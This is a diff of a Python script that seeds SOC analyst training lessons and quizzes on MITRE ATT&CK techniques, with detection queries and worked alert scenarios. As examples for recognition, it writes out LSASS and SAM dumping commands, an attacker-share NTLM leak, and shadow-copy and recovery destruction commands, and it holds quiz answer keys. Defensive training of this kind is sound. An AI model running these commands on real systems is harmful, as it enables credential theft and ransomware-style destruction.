+### T1112 Modify Registry, T1140 Deobfuscate, T1497 Sandbox Evasion
+
+- **T1112** — disabling LSA Protection, AMSI providers, WDigest credential caching settings.
+- **T1140 Deobfuscate/Decode Files or Information** — small stager pulls a base64/AES-encrypted blob and decrypts in memory; AMSI-captured deobfuscated content is the visible artefact.
+- **T1497 Virtualisation/Sandbox Evasion** — malware checks for VM artefacts (`vmtoolsd`, `vboxservice`) before executing payload.
+
+## Credential Access (TA0006)
+
+### T1003 OS Credential Dumping
+
+- **.001 LSASS Memory** — Mimikatz, `procdump -ma lsass.exe`, the **comsvcs.exe minidump trick** (`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full`), `nanodump`, `pypykatz`. **Sysmon EID 10** (ProcessAccess) targeting `lsass.exe` with high granted-access (`0x1010` / `0x1F0FFF`) is *the* canonical fingerprint. Defender raises *"Suspicious access to LSASS"* alerts.
+- **.002 Security Account Manager (SAM)** — `reg save HKLM\\SAM …` or VSS shadow copy.
+- **.003 NTDS** — domain controller `ntds.dit` extraction (via VSS or `ntdsutil ifm`).
+- **.006 DCSync** — abusing the AD replication API (`DRSUAPI`) to request password hashes for any account from a DC. **EID 4662** with the `DS-Replication-Get-Changes` GUID (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) from a non-DC source is the canonical signal.
+- **.008 /etc/passwd & /etc/shadow** — Linux credential dump.
+
+KQL — LSASS access pattern:
+
+```kql
+DeviceEvents
+| where Timestamp > ago(24h)
+| where ActionType == "OpenProcessApiCall"
+| where FileName =~ "lsass.exe"
+| extend GrantedAccess = tostring(parse_json(AdditionalFields).GrantedAccess)
+| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1f0fff","0x1fffff")
+| where InitiatingProcessFileName !in ("MsMpEng.exe","SenseIR.exe","CSFalconService.exe","Sysmon.exe","WindowsDefender.exe")
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, GrantedAccess
+| order by Timestamp desc
+```
+
+### T1110 Brute Force
+
+- **.001 Password Guessing** — single account, many passwords.
+- **.003 Password Spraying** — many accounts, few common passwords.
+- **.004 Credential Stuffing** — leaked-creds reuse.
+
+**Telemetry:** EID 4625 (failed logon) clusters; Entra `SignInLogs` with high failure ratio; *one success following many failures from same source* = compromised.
+
+### T1555.003 Credentials from Web Browsers
+
+`LaZagne`, `WebBrowserPassView`, infostealers (RedLine, Raccoon, Lumma) targeting Chrome's `Login Data` SQLite + DPAPI master key.
+
+### T1539 Steal Web Session Cookie
+
+The Module-6 AiTM payoff — cookies bypass MFA. Detection is downstream — the *use* of the cookie shows up as an Entra sign-in from a new device/IP.
+
+### T1187 Forced Authentication
+
+The Module-6 OPSEC trap: SMB-share UNC path or `.url` file with `IconFile=\\\\attacker\\share\\icon` causes the client to send NTLM hash to attacker. Catch with: outbound SMB (445) to non-trusted IP from a workstation.
+
+### T1558 Steal or Forge Kerberos Tickets
+
+- **.003 Kerberoasting** — request TGS for SPN-bearing accounts, crack offline. **EID 4769** with Ticket Encryption Type `0x17` (RC4-HMAC) when the environment policy is AES-only is the signal; high-volume 4769 from a single workstation against multiple SPNs is also classic.
+- **.004 AS-REP Roasting** — accounts with *"Do not require Kerberos preauth"* flag set; **EID 4768** with preauth-not-required.
+- **.001 Golden Ticket** — forged TGT signed with `krbtgt` hash.
+- **.002 Silver Ticket** — forged TGS signed with the service-account hash.
+
+### T1621 MFA Request Generation
+
+Push-bombing (Module 6). Entra: many sign-in attempts with `ResultType` indicating MFA was challenged in rapid succession from the same IP.
+
+## Discovery (TA0007) — the *cluster* signal
+
+Discovery alone is rarely a single high-severity alert — `whoami` is run on legitimate workstations every day. **The cluster is the signal:** 5–10 discovery commands within a few minutes from one user, on one host, often at an unusual hour. The classic *post-foothold orientation* minute.
+
+| Technique | Sub | Typical commands |
+|---|---|---|
+| **T1087** Account Discovery | .001 Local | `net user`, `net localgroup` |
+| | .002 Domain | `net user /domain`, `Get-ADUser -Filter *` |
+| **T1018** Remote System Discovery | — | `net view`, `arp -a`, `nltest /dclist:` |
+| **T1083** File and Directory Discovery | — | `dir /s C:\\Users`, `tree`, `Get-ChildItem` |
+| **T1057** Process Discovery | — | `tasklist`, `Get-Process` |
+| **T1016** System Network Configuration | — | `ipconfig /all`, `route print`, `arp -a` |
+| **T1033** System Owner/User | — | `whoami`, `query user` |
+| **T1069** Permission Groups | .001 Local | `net localgroup administrators` |
+| | .002 Domain | `net group "Domain Admins" /domain` |
+| **T1482** Domain Trust Discovery | — | `nltest /domain_trusts`, `Get-DomainTrust` |
+| **T1518** Software Discovery | .001 Security Software | `tasklist /v`, `Get-Service` |
+
+KQL — discovery cluster within 5 minutes:
+
+```kql
+let discovery_cmds = dynamic(["whoami","net user","net group","net localgroup","nltest","ipconfig","tasklist","arp","systeminfo","quser"]);
+DeviceProcessEvents
+| where Timestamp > ago(24h)
+| where ProcessCommandLine has_any (discovery_cmds)
+| summarize cmds=make_set(ProcessCommandLine), count() by DeviceName, AccountName, bin(Timestamp, 5m)
+| where count_ >= 4
+| order by Timestamp desc
+```
+
+**Two opposite L1 mistakes to avoid:**
+
+1. *"A single `whoami` is high-severity."* — it isn't; pivot for cluster.
+2. *"This cluster is informational because it's just discovery."* — domain-trust + Domain-Admin enumeration from a workstation is a strong post-foothold signal regardless of volume.
+
+## Glossary
+
+- **BYOVD** — Bring Your Own Vulnerable Driver (T1068 / driver-loaded kernel exploit pattern).
+- **EID 1102** — Security log cleared (T1070.001).
+- **EID 4662 + replication GUID** — DCSync (T1003.006); from a non-DC source IP.
+- **EID 4769 RC4** — Kerberoasting downgrade (T1558.003).
+- **Discovery cluster** — multiple discovery verbs in a short window; the cluster *is* the signal.
+
+## Further reading
+
+- LOLBAS — `lolbas-project.github.io`.
+- ATT&CK technique pages — `attack.mitre.org/techniques/`.
+- MITRE Engenuity Center for Threat-Informed Defense — top-techniques calculator.
+""",
+    )
+    m8l3q = _add_lesson(
+        session, mod8, order=6, title="PrivEsc, Evasion, Cred, Discovery — quiz",
+        lesson_type=LessonType.QUIZ, duration_min=8,
+        content_md="Four questions on T1003.006 fingerprint, Kerberoasting downgrade, the discovery-cluster pattern, and T1055 mis-classification.",
+    )
+    _add_q(session, m8l3q, order=1, kind=QuestionKind.SINGLE,
+        stem_md="A domain controller logs **EID 4662** with `Object Type: domainDNS`, properties including `DS-Replication-Get-Changes-All`, sourced from a workstation IP. Which ATT&CK sub-technique does this *most precisely* match?",
+        options=[
+            {"value": "t1003_001", "label": "T1003.001 — LSASS Memory"},
+            {"value": "t1003_003", "label": "T1003.003 — NTDS"},
+            {"value": "t1003_006", "label": "T1003.006 — DCSync"},
+            {"value": "t1558_001", "label": "T1558.001 — Golden Ticket"},
+        ],
+        correct="t1003_006",
+        explanation_md="EID 4662 with the replication GUID family (`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`) sourced from a *non-DC* IP is the canonical DCSync (T1003.006) signal — abuse of the AD `DRSUAPI` replication API to request password hashes for any account, from a non-DC. *Page-everyone* alert.",
+        points=2,
+    )
+    _add_q(session, m8l3q, order=2, kind=QuestionKind.MULTI,
+        stem_md="Which of the following are reliable Windows-Event-ID fingerprints for the techniques listed?",
+        options=[
+            {"value": "1102_t1070", "label": "EID 1102 (Security log cleared) → T1070.001"},
+            {"value": "4769_rc4", "label": "EID 4769 with TicketEncryptionType 0x17 (RC4-HMAC) when AES is policy → T1558.003 Kerberoasting"},
+            {"value": "4768_preauth", "label": "EID 4768 with preauth-not-required → T1558.004 AS-REP Roasting"},
+            {"value": "4624_lt2_t1003", "label": "EID 4624 LT2 (Interactive) → T1003.001 LSASS Memory"},
+            {"value": "4720_t1136", "label": "EID 4720 (User account created) → T1136 Create Account"},
+        ],
+        correct=["1102_t1070", "4769_rc4", "4768_preauth", "4720_t1136"],
+        explanation_md="EID 1102, 4769-with-RC4, 4768-with-no-preauth, and 4720 each map cleanly to the listed techniques. EID 4624 LT2 is interactive logon — *not* an LSASS-dumping signal; LSASS dumping is fingerprinted by Sysmon EID 10 ProcessAccess against `lsass.exe` with high granted-access masks.",
+        points=3,
+    )
+    _add_q(session, m8l3q, order=3, kind=QuestionKind.TRUEFALSE,
+        stem_md="A T1055 process-injection alert is, by default, a Privilege-Escalation event and should be tagged on the case as TA0004.",
+        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
+        correct="false",
+        explanation_md="**False.** T1055 is *primarily* a defense-evasion / process-context-cloak technique. It confers privilege only when injecting into a higher-integrity target — same-integrity injection is evasion, cross-integrity (medium → high or user → SYSTEM) is escalation. Look at source vs target integrity levels before tagging the tactic.",
+        points=2,
+    )
+    _add_q(session, m8l3q, order=4, kind=QuestionKind.SINGLE,
+        stem_md="On `WORKSTATION-7`, user `jsmith` runs `whoami`, `net group \"Domain Admins\" /domain`, `nltest /domain_trusts`, and `net view /domain` within 70 seconds at 09:14 UTC. What is the correct L1 reading?",
+        options=[
+            {"value": "info", "label": "Tag as 'T1033 informational'; close, since each command is benign in isolation"},
+            {"value": "cluster", "label": "Treat as a high-confidence post-foothold *discovery cluster* (T1033 + T1069.002 + T1482 + T1018) and pivot for the parent process plus 30-min lateral-movement evidence"},
+            {"value": "single", "label": "Open four separate cases, one per technique, and queue each independently"},
+            {"value": "block", "label": "Block `nltest.exe` at the EDR and close"},
+        ],
+        correct="cluster",
+        explanation_md="The cluster is the signal. A workstation user does not run `nltest /domain_trusts` and `net group \"Domain Admins\" /domain` in normal work — domain-trust + Domain-Admin enumeration in a 70-second window is the textbook first-minute-after-foothold orientation. Pivot 30 min before for parent process and 30 min after for T1003 / T1021. Per Module 7, escalate.",
+        points=2,
+    )
+
+    # Lesson 8.4 — Lateral / Collection / Exfil / Impact / C2 + chains + scenarios + ION
+    m8l4 = _add_lesson(
+        session, mod8, order=7,
+        title="Lateral Movement, Collection / Exfil / Impact, C2, the ransomware + cloud chains, worked scenarios, and ION conventions",
+        lesson_type=LessonType.READING, duration_min=28,
+        content_md="""
+> **Learning objectives.** By the end of this lesson you'll be able to:
+> 1. Recognise the **Lateral Movement**, **Collection**, **Exfiltration**, **Impact**, and **C2** techniques an L1 sees most often, with their canonical telemetry pivots
+> 2. Walk the modal **ransomware-affiliate intrusion chain** in ATT&CK shorthand, and recognise where dwell-time compression makes early-stage alerts urgent
+> 3. Walk the modal **cloud-incident chain** (BEC → tenant takeover) and recognise the cloud-specific sub-techniques
+> 4. Apply ION-specific conventions — matcher tier 3 / 4 use ATT&CK technique and tactic IDs; case-similarity uses technique tags
+> 5. Walk three end-to-end worked scenarios — discovery cluster, LSASS → DCSync, ransomware staging — and reason about the next-likely step in each chain
+> 6. Avoid the eight common L1 ATT&CK-mapping mistakes
+
+## Lateral Movement (TA0008)
+
+### T1021 Remote Services
+
+- **.001 RDP** — Logon Type 10, port 3389. Detection: 4624 LT10 from a non-jumpbox source.
+- **.002 SMB / Admin Shares** — ADMIN$, C$, IPC$. Logon Type 3 to admin shares from a non-server source.
+- **.003 DCOM** — `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow` objects abused for remote execution.
+- **.004 SSH** — `sshd` accepting password auth where keys are policy.
+- **.005 VNC** — port 5900.
+- **.006 WinRM** — port 5985/5986; `Enter-PSSession`, `Invoke-Command`. **EID 4624 with logon process `WinRM`** is the giveaway.
+
+### T1570 Lateral Tool Transfer
+
+Copying tooling between hosts after initial pivot — `copy` to `\\\\host\\C$\\Users\\Public\\…`, `bitsadmin /transfer`, `certutil -urlcache`.
+
+### T1550 Use Alternate Authentication Material
+
+- **.002 Pass-the-Hash** — NTLM hash reused without plaintext password. **EID 4624 NTLM with LT9 / LT3** from a non-DC source against an admin account is a strong signal.
+- **.003 Pass-the-Ticket** — Kerberos TGT/TGS reuse.
+
+### T1210 Exploitation of Remote Services
+
+EternalBlue (MS17-010), ProxyShell (Exchange), ZeroLogon (CVE-2020-1472), PrintNightmare.
+
+## Collection / Exfiltration / Impact (TA0009 / TA0010 / TA0040)
+
+### Collection
+
+- **T1005 Data from Local System** — recursive directory crawl + selective copy.
+- **T1114 Email Collection** — Module 6's inbox-rule exfil pattern (`.003 Email Forwarding Rule`).
+- **T1213 Data from Information Repositories** — SharePoint / Confluence / Teams / Jira.
+- **T1560.001 Archive Collected Data: with Utility** — `rar a -hp<password> out.rar C:\\target`, `7z a -p`, `Compress-Archive`. Signal: a rarely-seen utility archiving from Documents/Desktop/share into `%TEMP%` or `C:\\PerfLogs`.
+
+### Exfiltration
+
+- **T1041 Exfiltration Over C2 Channel** — exfil rides the C2 path.
+- **T1567.002 Exfiltration Over Web Service: Cloud Storage** — Mega, Dropbox, OneDrive, Google Drive, Discord CDN, transfer.sh, anonfiles, file.io, gofile.io. Fingerprint: `destination.domain` matches a public-file-host list AND `network.bytes` outbound is large.
+- **T1048 Exfiltration Over Alternative Protocol** — DNS, ICMP tunnel, raw FTP/SMB.
+
+### Impact — ransomware behaviour
+
+- **T1486 Data Encrypted for Impact** — the encryption phase. Signals: high CPU on cryptographic primitives, mass file-renaming with extension change, ransom-note files in every directory.
+- **T1490 Inhibit System Recovery** — `vssadmin delete shadows /all /quiet`, `wbadmin delete catalog -quiet`, `bcdedit /set {default} bootstatuspolicy ignoreallfailures`, `bcdedit /set {default} recoveryenabled No`. **The highest-priority L1 alert in this dossier.** Encryption is minutes away.
+- **T1485 Data Destruction** — wiper malware (NotPetya, HermeticWiper, IsaacWiper); cloud-bucket purge.
+- **T1489 Service Stop** — `net stop` / `Stop-Service` flurries against backup-related and database service names.
+
+## Command and Control (TA0011)
+
+- **T1071 Application Layer Protocol** — **.001 Web**, **.002 File Transfer**, **.003 Mail**, **.004 DNS**.
+- **T1573.002 Encrypted Channel: Asymmetric Cryptography (TLS)** — almost every modern C2 today.
+- **T1090 Proxy** — **.001 Internal**, **.002 External**, **.003 Multi-hop** (Tor / I2P), **.004 Domain Fronting**.
+- **T1568.002 Dynamic Resolution: DGA**.
+- **T1102 Web Service** — abuse of legitimate services as dead-drops or live channels: GitHub Pages, Discord webhooks, Cloudflare Workers, Telegram, Pastebin, Slack workspaces, Notion. Hard to detect — destinations are *legitimately reachable* for everyone.
+- **T1572 Protocol Tunneling** — DNS / ICMP / SSH tunnelling.
+- **T1219 Remote Access Software** — **AnyDesk, ScreenConnect, TeamViewer, Atera, Splashtop, NetSupport, Action1, Tactical RMM**. Ransomware affiliates install these specifically because they're allow-listed.
+
+### "Beacon shape" in practice
+
+- **Periodicity** — packets to one destination at near-constant intervals (e.g. every 60 s ± 10 s jitter).
+- **Size symmetry** — outbound POSTs clustered around a small range (heartbeat); inbound mostly small with occasional larger responses (tasking).
+- **Working-hours-agnostic** — beacons don't take weekends off.
+- **Sparse hostname diversity** — one host visiting one rare domain hundreds of times per day.
+
+Module 4 covered the detection mechanics; the ATT&CK lens is to recognise this as **T1071.001 + T1573.002** when HTTPS, **T1071.004 + T1572** when DNS-tunnelled, or **T1102** when the destination is a legitimate SaaS surface.
+
+## The modal ransomware-affiliate chain
+
+```mermaid
+flowchart LR
+    IA[Initial Access<br/>T1566 / T1078 / T1190] --> EX[Execution<br/>T1059.001]
+    EX --> CR[Cred Access<br/>T1003.001 + T1110]
+    CR --> LM[Lateral<br/>T1021.001 / .002 + T1550.002]
+    LM --> DI[Discovery<br/>T1087/T1018/T1482/T1069]
+    DI --> PE[Persistence<br/>T1543.003 + T1219 RMM]
+    PE --> DE[Defense Evasion<br/>T1562.001 + T1070.001]
+    DE --> IM[Impact<br/>T1490 then T1489 then T1486]
+```
+
+**Dwell-time compression matters.** Median dwell across major IR-retainer reports has compressed from late-2010s figures of 60–90 days to 2023–2024 medians of around **5–10 days**, with some affiliates going from initial access to encryption in **under 24 hours**. *"Dwell is short"* is the L1's mental prior. An alert that *looks like* an early step in the chain should not be deferred.
+
+When an alert lands, position it in the chain with three questions:
+
+1. **What's likely behind this?** What earlier-stage techniques would plausibly precede this alert?
+2. **What's likely ahead of this?** What follow-on techniques does this alert make probable?
+3. **How loud is the rest of the operator's expected behaviour?** Quiet follow-ons (T1219 RMM install) demand *pre-emptive* containment because you may not detect them once they fire.
+
+## The modal cloud-incident chain
+
+```mermaid
+flowchart LR
+    A[T1566.002<br/>phishing link] --> B[T1539<br/>cookie theft AiTM]
+    B --> C[T1078.004<br/>cloud sign-in]
+    C --> D[T1098.005<br/>device registration]
+    D --> E[T1098.001 / .003<br/>add OAuth secret / role]
+    E --> F[T1114.003 + T1213<br/>inbox rule + SharePoint pull]
+    F --> G[T1567.002<br/>exfil to cloud storage]
+```
+
+Same shape as on-prem (foothold → persistence → privilege → discovery → collection → exfil), different telemetry plane. Primary surfaces: **Entra Sign-In Logs**, **Entra Audit Logs**, **Microsoft Graph Activity Logs**, **Defender for Cloud Apps**, **AWS CloudTrail**, **GCP Admin Activity**.
+
+## ION-specific conventions
+
+- **AlertPromptTemplate matcher tier 3 (technique) + tier 4 (tactic)** — when `rule_id` and regex don't match, ION matches LLM prompt templates by **technique ID** then **tactic ID**. A *wrong* tactic at tier 4 sends a poorly-fitted prompt to Bob, weakening the verdict the analyst reads.
+- **Case taxonomy carries technique IDs** — every escalation packet (Module 7) propagates the technique mapping. Wrong technique = wrong propagation through the entire incident record.
+- **Bob's verdict cites technique IDs** — *"observed `vssadmin delete shadows` is consistent with T1490 Inhibit System Recovery, typically immediately preceding T1486"*. Read these fluently.
+- **Case similarity (pgvector)** — `/cases/{id}/similar` clusters by embedding *and* technique tag. Mis-tagged techniques fragment the cluster.
+
+## Worked scenario A — Discovery-cluster fingerprint
+
+**Alert:** *Process Discovery Cluster — 4 commands within 70 s on WORKSTATION-7.*
+
+```text
+2026-04-15T09:14:02Z  WORKSTATION-7  user: jsmith  cmd.exe  whoami
+2026-04-15T09:14:18Z  WORKSTATION-7  user: jsmith  cmd.exe  net group "Domain Admins" /domain
+2026-04-15T09:14:42Z  WORKSTATION-7  user: jsmith  cmd.exe  nltest /domain_trusts
+2026-04-15T09:15:11Z  WORKSTATION-7  user: jsmith  cmd.exe  net view /domain
+```
+
+**ATT&CK:** **T1033** + **T1069.002** + **T1482** + **T1018**.
+
+**L1 reasoning.** No single command is alarming. The *cluster within ~70 s* is. A user does not run `nltest /domain_trusts` from a workstation as part of normal work. This pattern matches the first 60 s after a foothold.
+
+**Action.** Pivot 30 min before for parent process. Pivot 30 min after for any T1003 / T1021. Escalate per Module 7's *behavioural cluster* criterion. Engage the user out-of-band to confirm context (do not alert by email if compromise is suspected).
+
+## Worked scenario B — LSASS read → DCSync chain
+
+**Alert 1 (T+0):** Defender — *Suspicious access to LSASS by Mimikatz-like signature* on `WORKSTATION-7`. Sysmon EID 10: `procdump.exe` accessing `lsass.exe` with granted-access `0x1F0FFF`. **ATT&CK: T1003.001.**
+
+**L1 pivot — same user/host, next 30 min:**
+
+- 4624 LT3/LT9 NTLM events from `WORKSTATION-7` against admin accounts → Pass-the-Hash (T1550.002).
+- 4769 Kerberos TGS bursts → forged-ticket usage (T1558).
+- 4662 with the replication GUID → DCSync (T1003.006).
+
+**Alert 2 (T+18 min):** EID 4662 on `DC01` — `Object Type: domainDNS`, `Properties: {DS-Replication-Get-Changes-All}`, `Account Name: svc-backup`, `Source: WORKSTATION-7`. **ATT&CK: T1003.006.** The `svc-backup` hash dumped in step 1 is now replicating domain credentials.
+
+**Action.** *Page everyone.* Isolate `WORKSTATION-7` (Defender Live Response: `Isolate-Machine`). Disable `svc-backup`. Page IR. Do not wait for further alerts — the operator is one step from Tier-0 control of the domain.
+
+```mermaid
+flowchart LR
+    A[T+0: LSASS read<br/>T1003.001<br/>WORKSTATION-7] --> B[T+18: 4662 DCSync<br/>T1003.006<br/>DC01 ← WORKSTATION-7]
+    B --> C{L1 decision}
+    C --> D[Isolate WORKSTATION-7]
+    C --> E[Disable svc-backup]
+    C --> F[Page IR]
+```
+
+## Worked scenario C — Ransomware staging
+
+**Alert (T+0):** EDR — *vssadmin used to delete shadow copies* on `FILESERVER-02`.
+
+```text
+ParentImage:    C:\\Windows\\System32\\cmd.exe
+Image:          C:\\Windows\\System32\\vssadmin.exe
+CommandLine:    vssadmin.exe delete shadows /all /quiet
+User:           NT AUTHORITY\\SYSTEM
+IntegrityLevel: System
+```
+
+**Pivot — same host, prior 10 min:**
+
+```text
+T-08m  cmd.exe  ←  payload.exe (entropy 7.9, signed: no)
+T-07m  vssadmin.exe delete shadows /all /quiet              [T1490]
+T-07m  wbadmin.exe delete catalog -quiet                    [T1490]
+T-06m  bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures   [T1490]
+T-06m  bcdedit.exe /set {default} recoveryenabled No        [T1490]
+T-05m  net.exe stop "MSSQLSERVER"                            [T1489]
+T-05m  net.exe stop "Veeam Backup Service"                   [T1489]
+T-04m  net.exe stop "BackupExecAgentAccelerator"             [T1489]
+T-03m  taskkill.exe /F /IM "sqlservr.exe"                    [T1489]
+```
+
+**ATT&CK:** **T1490** (multiple) + **T1489** (multiple). Predicted next: **T1486** (mass encryption).
+
+**Time pressure.** From `vssadmin delete shadows` to first ransom note is typically **2–10 minutes** on a fileserver. *There is no such thing as "monitoring" this alert; only acting on it.*
+
+**Action.** Network-isolate the host now. Page IR. Begin notifying owners of every business-critical share on the fileserver. Do not wait to enrich.
+
+## Common L1 ATT&CK-mapping mistakes
+
+1. **Citing the parent technique when a sub-technique fits.** `T1059` instead of `T1059.001` — drops precision for ION's matcher tier 3 and case similarity. *Cite the sub-tech when the artefact tells you which interpreter.*
+2. **Pinning a group / cluster name from a procedure example.** Cluster attribution rotates between vendors. *Cite the technique. Let case-similarity and Bob suggest cluster context.*
+3. **Treating any one discovery command as high-severity.** A single `whoami` is not the signal. *Pivot for the cluster window.*
+4. **Treating any discovery cluster as low-severity.** Domain-trust + Domain-Admin enumeration on a workstation is a strong post-foothold signal regardless of clustering volume. *Content matters, not just count.*
+5. **Mis-classifying T1490 as 'monitor'.** `vssadmin delete shadows` is *not* a monitor alert — encryption is minutes away.
+6. **Confusing process-injection alerts with privilege escalation.** T1055 is primarily defense evasion. Look at integrity-level differential before tagging the tactic.
+7. **Tagging cloud activity with on-prem technique parents.** T1078 instead of T1078.004 fragments the case-similarity index. *Verify the platform list at the top of the technique page.*
+8. **Reading 'Detection' patterns as 'must-match' rather than 'may-match'.** ATT&CK's Detection section gives illustrative analytic patterns. The technique is defined by *behaviour*, not by a specific command-line.
+
+## Glossary
+
+- **Modal ransomware chain** — IA → execution → cred access → lateral → discovery → persistence → evasion → impact (T1490 → T1489 → T1486).
+- **Modal cloud-takeover chain** — phish → AiTM → cloud sign-in → device-reg → role/secret → mailbox/SharePoint → exfil.
+- **Page-everyone alerts** — T1490, T1003.006 with replication GUID, T1486 mass file rename.
+- **Pre-emptive containment** — when the predicted next step in the chain is *quiet* (T1219 RMM install), don't wait for the next alert.
+
+## Further reading
+
+- Mandiant *M-Trends*, CrowdStrike *Threat Hunting Report*, Sophos *Active Adversary Report* — annual dwell-time medians and chain shape.
+- Red Canary *Threat Detection Report* — empirical "most-seen" technique chart.
+- MITRE Engenuity Center for Threat-Informed Defense — top-techniques calculator.
+""",
+    )
+    m8l4q = _add_lesson(
+        session, mod8, order=8, title="Lateral, Impact, C2 & ION — quiz",
+        lesson_type=LessonType.QUIZ, duration_min=8,
+        content_md="Four questions on T1490 ransomware staging urgency, the cloud chain mapping, ION matcher tiers 3-4, and the WinRM logon-process fingerprint.",
+    )
+    _add_q(session, m8l4q, order=1, kind=QuestionKind.SINGLE,
+        stem_md="An EDR alert fires on a fileserver: *'vssadmin used to delete shadow copies'* — `vssadmin.exe delete shadows /all /quiet` running as `NT AUTHORITY\\SYSTEM`. Within the prior 10 minutes, the same host shows `wbadmin delete catalog`, `bcdedit recoveryenabled No`, and `net stop MSSQLSERVER`. What is the correct L1 disposition?",
+        options=[
+            {"value": "monitor", "label": "Tag as T1490 informational, queue for follow-up next shift"},
+            {"value": "fp", "label": "Close as likely Veeam-class backup-tool false positive after a 30-minute review"},
+            {"value": "page", "label": "Network-isolate the host immediately, page IR, notify owners of business-critical shares — encryption (T1486) is minutes away"},
+            {"value": "user_check", "label": "Email the user / system owner asking whether they recently ran a maintenance script"},
+        ],
+        correct="page",
+        explanation_md="`vssadmin delete shadows` + `wbadmin delete catalog` + `bcdedit recoveryenabled No` + backup-service stops is the textbook T1490 / T1489 staging chain. From this signal to first ransom note is typically 2–10 minutes. There is no such thing as *monitoring* this alert — isolate, page IR, notify owners. Speed matters.",
+        points=2,
+    )
+    _add_q(session, m8l4q, order=2, kind=QuestionKind.MULTI,
+        stem_md="Map the modal **cloud-takeover** chain: phish → AiTM cookie theft → cloud sign-in → device registration → secret/role addition → inbox rule + SharePoint pull → exfil. Which technique IDs *correctly* map to those phases?",
+        options=[
+            {"value": "t1566", "label": "T1566.002 → T1539 → T1078.004 → T1098.005 → T1098.001 / .003 → T1114.003 + T1213 → T1567.002"},
+            {"value": "t1078", "label": "T1078 (parent only) for every cloud sign-in step"},
+            {"value": "t1003", "label": "T1003.001 LSASS Memory for the cloud sign-in step"},
+            {"value": "t1485", "label": "T1485 Data Destruction for the exfil step"},
+            {"value": "t1486", "label": "T1486 Data Encrypted for Impact for the exfil step"},
+        ],
+        correct=["t1566"],
+        explanation_md="Only the first option correctly maps the chain. Cloud sign-in is T1078.004 *(Cloud Accounts sub-tech)*, not T1078 parent. T1003.001 is on-prem LSASS dumping. T1485 is data destruction (cloud bucket delete) — different from exfiltration. T1486 is ransomware encryption — also unrelated to BEC exfil.",
+        points=3,
+    )
+    _add_q(session, m8l4q, order=3, kind=QuestionKind.TRUEFALSE,
+        stem_md="In ION's 5-tier AlertPromptTemplate matcher (rule_id → regex → MITRE technique → MITRE tactic → groups), citing the wrong tactic at tier 4 sends a poorly-fitted prompt to Bob and weakens the verdict the analyst reads.",
+        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
+        correct="true",
+        explanation_md="**True.** Tier 4 (tactic) is the fallback when neither `rule_id`, regex, nor technique-ID matches. A wrong tactic ID sends Bob a prompt template tuned for a different adversary phase — wrong context produces a wrong verdict. Correctly classifying the technique on novel alerts is operationally load-bearing for the AI-analyst pipeline.",
+        points=2,
+    )
+    _add_q(session, m8l4q, order=4, kind=QuestionKind.SHORTANSWER,
+        stem_md="A Windows Event 4624 successful logon record arrives showing the **logon process** field set to `WinRM`, with logon type 3, sourced from another workstation. Which ATT&CK sub-technique does this most precisely fingerprint? Give the T-number plus a short technique-name (or just the T-number).",
+        options=None,
+        correct=["T1021.006", "t1021.006", "T1021.006 winrm", "T1021.006 windows remote management", "1021.006"],
+        explanation_md="**T1021.006** Remote Services: Windows Remote Management. EID 4624 with the `WinRM` logon process is the canonical signal — `Enter-PSSession` / `Invoke-Command` ride this. Ports 5985 (HTTP) / 5986 (HTTPS).",
+        points=2,
+    )
+
+    print(f"  L1: {course.title} — 8 modules, 59 lessons (Module 8 Common ATT&CK Techniques @ proper depth — L1 COMPLETE)")
     return course
 
 
